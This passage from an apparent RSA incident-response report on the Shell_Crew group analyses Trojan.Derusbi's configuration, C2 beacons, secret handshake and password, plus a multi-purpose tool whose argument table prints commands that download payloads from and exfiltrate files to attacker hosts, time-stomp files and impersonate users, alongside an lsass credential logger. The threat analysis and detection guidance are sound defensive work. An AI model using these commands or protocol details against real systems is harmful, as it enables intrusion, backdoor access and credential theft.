19\n\nThe data below in Figure 22 illustrates the decoded configuration data. The machine name string and the hard coded\nC2 for this sample are highlighted in yellow (and have been changed to protect the victim).\n\n```\nOffset   0 1 2 3 4 5 6 7  8 9 A B C D E F\n00000000  2D 56 49 43 54 49 4D 2D 4D 41 43 48 49 4E 45 2D  -VICTIM-MACHINE00000010  33 37 39 38 00 57 29 57 74 59 41 73 59 57 51 33  3798 W)WtYAsYWQ3\n00000020  2D 3E 23 3C 7E 4F 72 29 21 4D 3C 5B 56 54 3D 47  ->#<~Or)!M<[VT=G\n00000030  5F 25 2D 4E 38 68 7A 39 50 53 5C 6D 32 70 33 00  _%-N8hz9PS\\m2p3 \n00000040  62 61 64 2E 6D 61 6C 77 61 72 65 6A 77 6D 2E 63  bad.malwarejwm.c\n00000050  6F 6D 3A 34 34 33 00 57 5A 53 74 5A 24 64 21 74  om:443 WZStZ$d!t\n00000060  47 24 74 3B 62 5D 35 77 46 4F 24 2E 71 56 66 2A  G$t;b]5wFO$.qVf*\n        ******Removed for Brevity******\n00000140  14 00 00 00 77 75 61 75 73 65 72 76 00 67 2A 66    wuauserv g*f\n00000150  22 75 5E 46 71 53 5A 27 38 2D 7A 51 25 47 50 49  \"u^FqSZ'8-zQ%GPI\n00000160  31 2D 40 70 00 00 00 00 00 31 59 22 72 5E 50 53  1-@p   1Y\"r^PS\n00000170  72 7A 5A 76 28 2E 34 6C 57 3A 4B 74 21 70 3C 7E  rzZv(.4lW:Kt!p<~\n00000180  46 76 69 32 38 77 74 57 00 59 4C 48 28 31 3B 67  Fvi28wtW YLH(1;g\n00000190  64 55 4E 6F 2C 6B 46 74 00 53 22 74 26 7A 26 5B  dUNo,kFt S\"t&z&[\n000001A0  45 70 50 5F 30 54 7E 38 6A A0 6B         EpP_0T~8j k\n\n```\n\n**Figure 22: Decoded Trojan.Derusbi configuration data**\n\nThis machine specific configuration data will then be encoded, using a different method, where each byte is XORed with\n0x5F and then each bit of that product byte is subsequently inverted. This encoded data will then be written to the\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Rpc\\Security registry key. Figure 23 below shows the function within the\nTrojan responsible for encoding this data and then writing it to the registry. If the sample is restarted it will again check for\nthe registry value containing the configuration data. If this value is located, the sample will read the configuration data and\nthen decode it using a function similar to the function that is depicted below.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 20\n\n**Figure 23: Trojan.Derusbi Configuration Data Encoding Function**\n\nUpon initial execution, the Trojan will decode, write, and launch a driver file that is embedded in the file at offset 0x19A40.\nThe data shown below in Figure 24 is how the data resides in the file.\n\n\n-----\n\nRSA Incident Response Page 21\n\nAs shown in Figure 24, the first DWORD that is highlighted in yellow is the 4 byte XOR key that is used to decode the driver\nfile. It should be noted that this XOR key is the same in several variants that were compiled over a year time frame. The\nsecond DWORD highlighted in blue is the length of data to be decoded (the size of the driver file) 0x52 18 or 21,016 bytes\ndecimal.\n\n```\nOffset   0 1 2 3 4 5 6 7  8 9 A B C D E F\n00019A40  F3 5D 88 2E 18 52 00 00 BE 07 18 2E F0 5D 88 2E  ó]ˆ. R ¾ .ð]ˆ.\n00019A50  F7 5D 88 2E 0C A2 88 2E 4B 5D 88 2E F3 5D 88 2E  ÷]ˆ. ¢ˆ.K]ˆ.ó]ˆ.\n00019A60  B3 5D 88 2E F3 5D 88 2E F3 5D 88 2E F3 5D 88 2E  ³]ˆ.ó]ˆ.ó]ˆ.ó]ˆ.\n00019A70  F3 5D 88 2E F3 5D 88 2E F3 5D 88 2E F3 5D 88 2E  ó]ˆ.ó]ˆ.ó]ˆ.ó]ˆ.\n00019A80  F3 5D 88 2E 13 5D 88 2E FD 42 32 20 F3 E9 81 E3  ó]ˆ. ]ˆ.ýB2 óé�ã\n00019A90  D2 E5 89 62 3E 7C DC 46 9A 2E A8 5E 81 32 EF 5C  Òå‰b>|ÜFš.¨^�2ï\\\n00019AA0  92 30 A8 4D 92 33 E6 41 87 7D EA 4B D3 2F FD 40  ’0¨M’3æA‡}êKÓ/ý@\n00019AB0  D3 34 E6 0E B7 12 DB 0E 9E 32 EC 4B DD 50 85 24  Ó4æ · Û ž2ìKÝP…$\n00019AC0  D7 5D 88 2E F3 5D 88 2E 94 52 8B C5 D0 33 E5 96  ×]ˆ.ó]ˆ.”R‹ÅÐ3å–\n00019AD0  D0 33 E5 96 D0 33 E5 96 D9 4B 70 96 D3 33 E5 96  Ð3å–Ð3å–ÙKp–Ó3å–\n00019AE0  D0 33 E4 96 FA 33 E5 96 13 3C B8 96 D5 33 E5 96  Ð3ä–ú3å– <¸–Õ3å–\n00019AF0  13 3C BA 96 D1 33 E5 96 D9 4B 66 96 D4 33 E5 96  <º–Ñ3å–ÙKf–Ô3å–\n00019B00  D9 4B 61 96 D5 33 E5 96 D9 4B 71 96 D1 33 E5 96  ÙKa–Õ3å–ÙKq–Ñ3å–\n00019B10  D9 4B 74 96 D1 33 E5 96 A1 34 EB 46 D0 33 E5 96  ÙKt–Ñ3å–¡4ëFÐ3å–\n\n```\n\n**Figure 24: XOR key that is used to decode the driver file**\n\nThe function below in Figure 25 is responsible for decoding the driver file. This function will call an additional function that\nis responsible for writing the decoded data to disk as ‘C:\\Windows\\System32\\Drivers\\{6AB5E732-DFA9-4618-AF1CF0D9DEF0E222}.sys’. The Trojan will then use the API call ZwLoadDriver to start the newly created file.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 22\n\n**Figure 25: Trojan.Derusbi Driver Decoding Function**\n\nThe driver will hook other networking drivers and will determine if incoming traffic contains certain patterns of traffic,\nwhich when specific conditions are met will pipe that traffic to Trojan.Derusbi. Once the Trojan begins to communicate with\nthe hard coded C2, it will initially transmit the following POST request shown in Figure 26.\n\n```\nPOST /forum/login.cgi HTTP/1.1\nHOST: bad.malwarejwm.com:443\nUser-Agent: Mozilla/4.0\nProxy-Connection: Keep-Alive\nConnection: Keep-Alive\nPragma: no-cache\n\n```\n\n**Figure 26: POST request initiated by Trojan.Derusbi**\n\nIf no response is received it will transmit the following binary data shown in Figure 27, which is part of a proprietary\nhandshake that is discussed more in the Trojan.Derusbi – Server Variant section. The Binary data contains a set of three\nDWORDs that the C2 will validate to as part of the initial portion of the handshake. The first DWORD is created just prior to\nthe beaconing activity. The following two DWORDs are mathematical modifications of the first DWORD.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 23\n\n```\n00000000 ae 3d 00 00 51 c2 ff ff 7b 00 00 5c 87 0b 00 00 .=..Q... {..\\....\n00000010 cf 4e 00 00 3c 08 00 00 19 55 00 00 46 3a 00 00 .N..<... .U..F:..\n00000020 e4 41 00 00 4c 76 00 00 3b 65 00 00 28 6a 00 00 .A..Lv.. ;e..(j..\n00000030 a7 43 00 00 08 26 00 00 3c 7b 00 00 c9 6b 00 00 .C...&.. <{...k..\n\n```\n\n**Figure 27: Binary data transmitted by Trojan.Derusbi**\n\nAs illustrated below in Figure 28, the second DWORD is the product of XORing the first DWORD with 0xFF. The third\nDWORD is the product of rotating the first DWORD value right by 7.\n\n```\n1[st] DWORD = 0x00003DAE\n2[nd] DWORD = 0x00003DAE ^ 0xFF = 0xFFFFC251\n3[rd] DWORD = 0x00003DAE ROR 7  = 0x5C00007B\n\n```\n\n**Figure 28: The Binary data contains a set of three DWORDs**\n\nIf the Trojan does not receive the other necessary portions of the Trojan/C2 handshake it will transmit the following type of\nGET request. The ‘loginid’ that is highlighted in yellow in Figure 29 is created pseudorandomly.\n\n```\nGET /Photos/Query.cgi?loginid=24072 HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0;\nWindows NT 5.1)\nHost: bad.malwarejwm.com:443\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\n\n```\n\n**Figure 29: GET request transmitted by the Trojan**\n\nThis Trojan has several advanced capabilities including providing a reverse shell to the adversary, locating and decrypting\nusernames and passwords stored by web browsers like Internet Explorer and Firefox, uploading and downloading files, and\nexecuting additional malicious files.\n\nAppendix 1 of this report illustrates how several variants of Trojan.Derusbi have overlapping characteristics. Having the\nability to quickly detect relationships between different variants allows the RSA IR Team to locate not just specific samples,\nbut variants throughout an environment within the same family.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 24\n\n##### 2. Trojan.Derusbi Server Variant\n\nShell_crew deployed this variant of Trojan.Derusbi on perimeter devices in a victim’s network. This variant contains a driver\nthat monitors all incoming TCP connections for a secret handshake. The handshake is simple enough to allow this variant to\nfunction even on busy web servers. Once the handshake is received, the driver then passes control to the DLL file which\ncontains the main functionality of the Trojan. Characteristics of one such Trojan.Derusbi server variant can be found in\nFigure 30.\n\n```\nFile Name: 2.dll\nFile Size: 65816 bytes\nMD5:    7c32302791501d817fe9ecb589ecc026\nSHA1:    e473e936374aed2701c9455b487cdf2cbec30cf8\nPE Time:  0x4FE740F9 [Sun Jun 24 16:31:53 2012 UTC]\nPEID Sig:  Microsoft Visual C++ v6.0 DLL\nPEID Sig:  Microsoft Visual C++ v7.0 DLL\nSections (5):\n Name   Entropy MD5\n .text   6.22   f8a33e42f67dc9ea82e50698556c2e19\n .rdata  4.95   f795dbaabc5a4dc86780a02c7fb9bbd0\n .data   7.07   5085436ae0b2d8977b4034aae2d98ad6\n .rsrc   2.88   b69e32f439cc4bd33e4dd5ea23bfe02b\n .reloc  5.39   5e891a6fb9398ffed88fda988ee49422\n .rsrc   2.89   463fc58dc7c103c564540cd1191f6c06\n .reloc  6.03   7430b0b237db5acf3c691df23c915847\n\n```\n\n**Figure 30: Characteristics of the file 2.dll - a Trojan.Derusbi variant**\n\nThe Trojan exports the functions shown in Table 2 below.\n\n**Entry Point** **Ordinal** **Name**\n\n**100067FBh** 1 DllRegisterServer\n\n**10006777h** 2 DllUnregisterServer\n\n**10004CFFh** 3 ServiceMain\n\n**10004CF0h** 4 SvchostPushServiceGlobals\n\n**10004FAAh** 5 WUServiceMain\n\n**10007223h** 6 _crt_debugger_hook\n\n**Table 2: Trojan.Dersubi server variant functions**\n\nThe adversary installed this Trojan by utilizing the regsvr32.exe utility, which calls the DllRegisterServer function. This Trojan\nfirst checks the version of Windows it is running on using the GetVersionExA function, and will terminate if not on a\nWindows version 5.2 as shown in Figure 31.\n\n|Entry Point|Ordinal|Name|\n|---|---|---|\n|100067FBh|1|DllRegisterServer|\n|10006777h|2|DllUnregisterServer|\n|10004CFFh|3|ServiceMain|\n|10004CF0h|4|SvchostPushServiceGlobals|\n|10004FAAh|5|WUServiceMain|\n|10007223h|6|_crt_debugger_hook|\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 25\n\n**Figure 31: Derusbi server variant - check OS version logic**\n\nThis versions of Windows this covers is:\n\n    - Windows 2003 Server;\n\n    - Windows 2003 Server R2; and\n\n    - Windows XP 64-bit Edition.\n\nThe Trojan then validates that it is not running on a 64-bit system by using the IsWow64Process function. The servers\nwhere this Trojan was found during the engagement were Windows 2003 servers, confirming the Shell_Crew had created\nthis variant of the Trojan.Derusbi to run specifically on this family of Operating Systems. The Trojan then makes a copy of\nitself into the C:\\Windows\\System32 folder as a file named: “msusbXXX.hlp”, where XXX were found to be three characters\npicked randomly from this set of characters: abcdefghijklmnopqrstuvwxyz.\n\nThe Trojan then entrenches itself as a service named “wuauserv” as illustrated in Figure 32.\n\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\\Parameters  ServiceDLL:\n%Systemroot%\\System32\\msusbfmg.hlp\n\n```\n\n**Figure 32: Registry key identifying the service name and Trojan file**\n\nFurthermore, this Trojan also drops a driver file on the system named: {93144EB0-8E3E-4591-B307-8EEBFE7DB28F}.sys.\nThis driver file is embedded into the DLL starting at file-offset 0x9290. The contents of this file are obfuscated with a 4-byte\nXOR key: 0xF35D882E.\n\nOnce the driver file is loaded in memory, the file is deleted from the file system. The following registry key remains as an\nartifact: **HKLM\\SYSTEM\\CURRENTCONTROLSET\\ENUM\\ROOT\\LEGACY_{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}. The**\ndriver also attaches to the following network devices:\n\n    - \\Driver\\Tcpip\\Device\\Ip;\n\n    - \\Driver\\Tcpip\\Device\\Tcp;\n\n    - \\Driver\\Tcpip\\Device\\Udp; and\n\n    - \\Driver\\Tcpip\\Device\\RawIp.\n\nThe driver can then monitor traffic to any existing listening TCP ports. The driver performs the following three checks on\nany new TCP connections:\n\n    - Ensures the payload of the first packet equals 64 bytes;\n\n    - Ensures 2nd DWORD = Inverted 1st DWORD (i.e. logical NOT, or XOR 0xFF); and\n\n    - Ensures 1st DWORD ROR 7 = 3rd DWORD.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 26\n\n**Figure 33: Driver logic that looks for handshake**\n\nAll the data in the handshake is randomly generated. Other than the first three DWORDS (12 bytes), the rest of the data in\nthe 64-byte handshake is irrelevant. The structure of the handshake is shown below in Figure 34:\n\n**Figure 34: Trojan.Derusbi server variant handshake structure**\n\nThe malicious DLL performs the last two checks on the handshake data as well. It then replies back with the same type of\nhandshake. All data is randomly generated independent of what data was received. Figure 35 depicts a sample handshake.\n\n**Figure 35: Trojan.Derusbi server variant handshake sample data**\n\nThe handshake is followed by a password verification step. The structure of the data also changes from this point forward.\nThis sample uses password, “pinkcomein”. The client Trojan service sends the password after obfuscating it with a 4-byte\n\n\n-----\n\nRSA Incident Response Page 27\n\nXOR key, which is dynamically generated and sent with the rest of the data. The checksum is a simple addition of all the\nbytes prior to the obfuscation step.\n\n**Figure 36: Trojan.Derusbi server variant - authentication**\n\nOnce the password has been confirmed, the communication protocol adds one additional component. All data beyond the\nheaders is compressed using the LZO[3] fast compression algorithm, prior to being obfuscated with the 4-byte XOR key. The\ncommands sent to the server also need to be compressed and obfuscated. Figure 37 shows an example that demonstrates\nall these components of the communication protocol (XOR key in this example was set to 0x00000000 to expose the next\nlayer for demonstration purposes).\n\n**Figure 37: Trojan.Derusbi server variant – protocol components**\n\nThe commands are in binary form. In the example shown in Figure 37, the command is 0x10 (which is visible even though\nthe data is compressed), uninstalls the Trojan, and restores the original registry keys. The rest of the functionality of this\nTrojan is typical to this family of Trojans including; file traversal, process start/terminate, upload/download, time\nstomping, and self-updates.\n\n3\n[http://www.codingnow.com/windsoul/package/lzoc.htm](http://www.codingnow.com/windsoul/package/lzoc.htm)\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 28\n\n### Secondary Tools – Technical Analysis\n\nThis section contains the technical analysis of several secondary tools that are favored by Shell_Crew. The secondary tools\nare programs that facilitate lateral movement, harvesting of credentials, or allow for additional channels of communication.\nDuring recent engagements involving Shell_Crew, the secondary tools were introduced into the environment during the\nearly stages of a compromise indicating that these are the preferred tools of this group. Shell_Crew also employs several\nadditional tools that are commonly used by other threat groups and will not be covered in this report.\n\n##### 1. Notepad.exe\n\nOne of the preferred tools used by Shell_Crew during a recent incident was a multi-purpose tool typically named\n'notepad.exe’, but also found named ‘inetinfo.exe’ or ‘mszip.exe’. The collected sample of this tool was written in .NET 2.0\nand the code was obfuscated using the post-development recompilation system “Dotfuscator”. This tool does not have a\nbuilt-in C2 address, however the code does support this feature. This tool requires arguments to be passed to it in order to\nperform activities. One of the most commonly used commands by the adversary was the proxy like functionality of this tool\nas show below in Figure 38.\n\n\n**c:\\dell\\notepad.exe /f sh /x 10.192.59.10 /y 80 /s upload.msdnblog.com /p 443**\n\n\n**Figure 38: Common usage of notepad.exe**\n\nIn this example, the proxy functionality of notepad.exe allowed the adversary to proxy their traffic to the external site\n“upload.msdnblog.com” through internal IP address 10.192.59.10 on port 80.\n\n```\nFile Name: notepad.exe\nFile Size: 186880 bytes\nMD5:    985abc913a294c096718892332631ec9\nSHA1:    a0d2cb07842813ebcbf31e30895887740f01f5d7\nPE Time:  0x4F3E6880 [Fri Feb 17 14:47:28 2012 UTC]\nPEID Sig:  Microsoft Visual C# / Basic .NET\nPEID Sig:  .NET executable compressor\nSections (3):\n Name   Entropy MD5\n .text   5.56   ab3d5c3c7dc3548585a8182ab8720f03\n .rsrc   4.16   b5167609962c7d22da2e6e7aa7259e84\n .reloc  0.1   2691c06804eb4834bdcf32c2e02ba33c\n\n```\n\n**Figure 39: File details of notepad.exe**\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 29\n\nIn order to decompile notepad.exe, the code was deobfuscated using a publicly available tool called “de4dot”. Once the\ncode had been deobfuscated, notepad.exe could be decompiled for analysis using the tool “Reflector”.\n\nThe RSA IR team was able to review the functionality of this tool and a complete list of the available parameters is provided\nin Table 3. During testing it was found that when this file was executed with no arguments, the tool performs the following\nactions:\n\n1. The tool would hash the string “alice'srabbithole” (MD5: 75BAA77C842BE168B0F66C42C7885997)\n2. The tool then checks if the resource shown in Figure 40 starts with the hash value obtained in step 1 (in this case\nthere is a match).\n\n**Figure 40: Resource of notepad.exe**\n\n3. If the result of step 2 is true, the Trojan exits without doing anything else. It is in this resource that the Trojan\nwould otherwise find an IP address and port number to connect. The resource would have the format shown in\nFigure 41:\n\n**Figure 41: Notepad.exe - built in C2 data structure**\n\nThe first two bytes of the resource will be a hexadecimal value representing the length of the Base64 encoded data that\nfollows. The obfuscated data is first Base64 decoded, then XOR-ed with 0xAA. The obfuscated data is meant to be an IP\naddress followed by a port number, separated by a colon “:”. The following figure shows the functions from the code.\n\n**Figure 42: C2 obfuscation in notepad.exe**\n\n\n-----\n\nRSA Incident Response Page 30\n\nThis tool can be executed in various ways depending on the arguments provided. Table 3 shows a complete this of the\ndiscovered parameters.\n\n**Notepad.exe arguments** **Purpose** **Sample Output**\n\n/f v Version info 2\n2.0.887.1303\n/f dl /url http://www.bad.com/trojan.jpg /file test.exe Download file. No GET /trojan.jpg HTTP/1.1\nobfuscation. Host: www.bad.com\n\nConnection: Keep-Alive\n/f ul /url http://www.bad.com/exfil.txt /file exfil.txt Upload a file. No POST /exfil.txt HTTP/1.1\nobfuscation Content-Type: multipart/form-data; boundary=--------------------\n8d02564845381fa\nHost: www.bad.com\nContent-Length: 218\nConnection: Keep-Alive\n\n-----------------------8d02564845381fa\nContent-Disposition: form-data; name=\"file\"; filename=\"exfil.txt\"\nContent-Type: application/octet-stream\n\nTHIS IS MY SENSITIVE DATA\n-----------------------8d02564845381fa-/f sh /x 192.168.1.1 /y 80 /s 10.10.10.1 /p 666 /u username HTTP proxy connect. CONNECT 10.10.10.1:666 HTTP/1.0\n/w password Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=\n\n[Actual adversary command: /f sh /x 10.19.59.10 /y 80 /s\nupload.msdnblog.com /p 443]\n/f sh /l /p 666 Listener mode When a client connects:\n03 01 74 80 0e d1 3b 4e 0c db 33 00 02 00 00 00\n77 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n/f d /t exfil.txt File info Name=exfil.txt\nLength=25\nDirectoryName=C:\\MALWARE\nDirectory={ }\nIsReadOnly=False\nExists=True\nFullName=C:\\MALWARE\\exfil.txt\nExtension=.txt\nCreationTime=5/23/2013\nCreationTimeUtc=5/23/2013\nLastAccessTime=5/23/2013\nLastAccessTimeUtc=5/23/2013\nLastWriteTime=5/23/2013\nLastWriteTimeUtc=5/23/2013\nAttributes=Archive\nnotepad.exe /f cl /p directory /m pattern regex options Clean files and time Replace pattern on file in specified folder and time stomp back\nstomp to original file timestamp.\n\n/f tu /p test /m *tampered* /r c:\\windows\\explorer.exe Time stomp file Match files with name “tampered” in directory test and change\nCMA timestamps to match those of reference file “/r”. If “/r”\nargument is not specified or if file is not found set to 11-30-2005\n12:00PM UTC.\n/f ra /ru /rd /rp /wp arguments RunAs command ru – username\nrd – domain name\nrp – password\nwp – with profile\n/iu /id /ip Impersonate user iu – username\nid – domain name\nip – password\n\n|Notepad.exe arguments Purpose Sample Output|Col2|Col3|\n|---|---|---|\n|/f v|Version info|2 2.0.887.1303|\n|/f dl /url http://www.bad.com/trojan.jpg /file test.exe|Download file. No obfuscation.|GET /trojan.jpg HTTP/1.1 Host: www.bad.com Connection: Keep-Alive|\n|/f ul /url http://www.bad.com/exfil.txt /file exfil.txt|Upload a file. No obfuscation|POST /exfil.txt HTTP/1.1 Content-Type: multipart/form-data; boundary=--------------------- 8d02564845381fa Host: www.bad.com Content-Length: 218 Connection: Keep-Alive -----------------------8d02564845381fa Content-Disposition: form-data; name=\"file\"; filename=\"exfil.txt\" Content-Type: application/octet-stream THIS IS MY SENSITIVE DATA -----------------------8d02564845381fa--|\n|/f sh /x 192.168.1.1 /y 80 /s 10.10.10.1 /p 666 /u username /w password|HTTP proxy connect.|CONNECT 10.10.10.1:666 HTTP/1.0 Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ= [Actual adversary command: /f sh /x 10.19.59.10 /y 80 /s upload.msdnblog.com /p 443]|\n|/f sh /l /p 666|Listener mode|When a client connects: 03 01 74 80 0e d1 3b 4e 0c db 33 00 02 00 00 00 77 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00|\n|/f d /t exfil.txt|File info|Name=exfil.txt Length=25 DirectoryName=C:\\MALWARE Directory={ } IsReadOnly=False Exists=True FullName=C:\\MALWARE\\exfil.txt Extension=.txt CreationTime=5/23/2013 CreationTimeUtc=5/23/2013 LastAccessTime=5/23/2013 LastAccessTimeUtc=5/23/2013 LastWriteTime=5/23/2013 LastWriteTimeUtc=5/23/2013 Attributes=Archive|\n|notepad.exe /f cl /p directory /m pattern regex options|Clean files and time stomp|Replace pattern on file in specified folder and time stomp back to original file timestamp.|\n|/f tu /p test /m *tampered* /r c:\\windows\\explorer.exe|Time stomp file|Match files with name “tampered” in directory test and change CMA timestamps to match those of reference file “/r”. If “/r” argument is not specified or if file is not found set to 11-30-2005 12:00PM UTC.|\n|/f ra /ru /rd /rp /wp arguments|RunAs command|ru – username rd – domain name rp – password wp – with profile|\n|/iu /id /ip|Impersonate user|iu – username id – domain name ip – password|\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 31\n\n**Notepad.exe arguments** **Purpose** **Sample Output**\n\nImpersonate user\nWindows s – system\nManagement u – username\nInstrumentation p – password\ncommands a – Kerberos impersonation level\n\nm – WMI command:\n\n                                                    - query  run WMI query\n                                                    - call  call WMI\n                                                    - get  [no logic to do anything]\n\n**Table 3: notepad.exe functionality**\n\n##### 2. Credential Logger\n\nOn a compromised Windows system, credentials can be harvested in a variety of ways:\n\n    - Hash Dumping\n\n    - Keystroke logging\n\n    - MSGINA man-in-the middle\n\n    - Hooking Authentication Functions\n\nOne such example that was observed during a recent engagement was a DLL file that Shell_Crew had injected into the\nlsass.exe process of a server to harvest credentials. The characteristics of this DLL file are shown in Figure 43.\n\n|Notepad.exe arguments Purpose Sample Output|Col2|Col3|\n|---|---|---|\n|/f rs|Impersonate user||\n|/f wmi|Windows Management Instrumentation commands|s – system u – username p – password a – Kerberos impersonation level m – WMI command: - query  run WMI query - call  call WMI - get  [no logic to do anything]|\n\n```\nFile Name: xmlobj.dll\nFile Size: 20480 bytes\nMD5:    90eddad3327a63fdea924fb802bc7dc5\nSHA1:    ecd9f328d119a82718634700f0e1fd5f19e9b08c\nPE Time:  0x4F908F71 [Thu Apr 19 22:19:29 2012 UTC]\nPEID Sig:  Microsoft Visual C++ v6.0 DLL\nSections (4):\n Name   Entropy MD5\n .text   4.21   445cb9843ec80eb2465a099f63fcdf0a\n .rdata  1.04   f8e9796e79523ae3980491e67e33521d\n .data   0.37   b77c7f741344e8c0326394129484cf5b\n .reloc  0.61   1373d7f72c5ca95a4bc001b04e4dc710\n\n```\n\n**Figure 43: Details of the file xmlobj.dll**\n\nOnce this DLL is injected into the lsass.exe process, it hooks the LsaApLogonUserEx2 function of msv1_0.dll. This function is\ncalled during various authentication situations such as interactive or network logons, including when the RunAs option is\nused. All credentials are saved in plaintext under: c:\\windows\\system32\\desktop.ini.\n\nA sample of harvested credentials that would be stored in the desktop.ini file is shown in Figure 44.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 32\n\n```\n  Domain: mydomain\n  UserID: administrator\n  Passwd: P@ssword12\n  Domain: mydomain\n  UserID: john\n  Passwd: NewYear2013\n\n```\n\n**Figure 44: Sample of harvested credentials**\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 33\n\n### Detection, Mitigation, and Remediation\n\nThe below sections outline information and detection capabilities that can assist with identification of activity or tools\nassociated with Shell_Crew. Additionally, the RSA IR Team has included a digital appendix along with this report that\ncontains content that can be integrated into Security Analytics, the Enterprise Compromise Assessment Tool (ECAT), or\nother security tools for rapid detection and visibility of indicators associated with Shell_Crew within an enterprise\nenvironment.\n\n##### 1. General Forensic Footprints\n\n    - On multiple cases Shell_Crew has been seen breaching a network by exploiting vulnerable applications on\nexternal facing servers. Web server logs, if available, can reveal the intrusion vector.\n\n    - Shell_Crew has a preference for storing files in the C:\\Recycler folder, or in other standard folders one level\ndeep from the root, such as the C:\\Dell, c:\\i386, or C:\\Reboot folders. Sometimes tools or Trojans have also\nbeen found at the root of the C: drive.\n\n    - In addition to connecting to remote systems, copying files, and scheduling jobs to execute them, Shell_Crew\nhas a preference for lateral movement using RDP. Additionally, they’ve used the Sysinternals tool psexec.exe\nto execute a file remotely, sometimes automated via a VBS script.\n\n    - Performing forensic analysis on a compromised system’s registry hive (focusing on the Application\nCompatibility Cache) can yield numerous artifacts related to Shell_Crew’s activity.\n\n    - Using a tool like ECAT, metadata about malicious files and code can be rapidly located throughout an\nenterprise allowing responders to focus on relevant systems. Host based signatures can be used in conjunction\nwith this methodology to allow for improved efficiency. The Yara signatures listed below are currently used by\nthe RSA IR Team to locate some malicious files specific to this group. A tool like ECAT can utilize these\nsignatures to scan memory of systems across a network.\n\n    - If the adversary registers any Dlls with IIS, these should be unregistered when they are removed from the\ncompromised system. Similarly any altered files, like System.web.dll, should be deleted and replaced with a\nclean copy of the original Microsoft file.\n\n    - Data theft by Shell_Crew typically involves use of the WinRAR utility using encrypted and password protected\nrar files. Here are some password seen used by Shell_Crew:\n\n           - `www.google.com`\n           - `www.google.com!123`\n           - `fuckalnt76yiuudg`\n\n##### 2. Security Analytics Integration\n\nParsers\n\nWhile standard network signatures will detect some of the Trojans and tools used by Shell_Crew, the Trojan.Derusbi\nsamples detailed in this report were designed to avoid detection by employing a proprietary handshake derived from\npseudorandom values dynamically calculated at runtime. The digital appendix provided with this report contains several\nSecurity Analytics parsers that can assist in the detection of these Trojan.Derusbi handshakes and additional variants\nrelated to these samples. Once enabled, these parsers will generate meta entitled “derusbiserver_handshake” or\n“derusbi_variant” in the Risk.Warning category within Security Analytics.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 34\n\nFeeds\n\nAlso included within the digital appendix are feeds that can be imported into Security Analytics for detection of potential\nShell_Crew activity. These feeds will alert users if there are any machines on the network communicating with malicious IP\nAddresses or URLs linked to Shell_Crew identified domains or IP’s within this report. Once enabled, these feeds will\ngenerate meta entitled “derusbi_domain_sep201”3 or “derusbi_ip_sep2013” in the Risk.Warning category within Security\nAnalytics.\n\n##### 3. ECAT Integration\n\nThe hashes that are referenced in the Malicious Files and Tools section of this report are also available in the digital\nappendix. The format of the files in the digital appendix can be imported directly into ECAT to begin looking for the hashes\nacross systems within the environment.\n\nBy default, ECAT is also able to detect some of the malicious behavior that is exhibited by the samples detailed in this\nreport. The below examples are provided to demonstrate how potential Shell_Crew activity can be identified using\nstandard analysis capabilities via the ECAT Server.\n\nFigure 45 is a screenshot where ECAT detected a suspicious outbound connection. The screen shot depicts the attempted\nconnections of the Trojan.Derusbi sample that was detailed earlier in this report. With this information, ECAT can be used\nto quickly determine if any other systems on the network had executable files that were actively beaconing to the same\nlocation.\n\n**Figure 45: ECAT detects a suspicious outbound connection**\n\nThe same malicious file seen above was also flagged as suspicious by ECAT because it was entrenched in an ‘autorun’\nlocation within the system’s registry. The screen shot in Figure 46 below depicts the alert provided by ECAT.\n\n**Figure 46: Alert sent by ECAT**\n\nAdditionally, the RSA IR Team observed that Shell_Crew will time stomp (alter a files Created Date and Time Stamp) to\nhinder forensic analysis. By default, ECAT has the ability to parse a system’s MFT and display both the File Name Attribute\ninformation and Standard Information Attribute for a file. The screen shot below shows an instance where the files had\nbeen time stomped. The files were purportedly created on the compromised systems in 2005, when in actuality they had\nbeen placed on the systems in 2012.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 35\n\n**Figure 47: MFT File Viewer in ECAT**\n\n\n##### 4. Yara Signatures\n\nThe RSA IR Team uses Yara Signatures like the ones provided in the digital appendix to detect malicious files present on\nsystems and running in memory. They’re also used to detect new variants that are being tested by adversaries using open\nsource tools like VirusTotal. The RSA IR Team has observed that Shell_Crew will submit numerous samples of a Trojan\nfamily to VirusTotal in an attempt to determine which AV vendors will detect the malicious files.\n\nShell_Crew will make small changes to the code and how the binary is compiled until a particular AV vendor does not detect\nthe sample. Detecting these variants using Yara Signatures allows the RSA IR Team to update and alter signatures, analyze\nnew variants, and become aware of new C2 nodes before the samples are used against targeted organizations. This\ninformation is then added to existing content in Security Analytics and ECAT. Figure 48 is a graph that depicts where\nvariants of a sample were submitted numerous times, each time being detected by different AV products.\n\n\n12 4/11/2013 8:46:44 AM UTC4/11/2013 11:20:49 AM UTC4/11/2013 11:21:25 AM UTC4/11/2013 11:25:45 AM UTC4/11/2013 11:27:20 AM UTC4/11/2013 11:29:27 AM 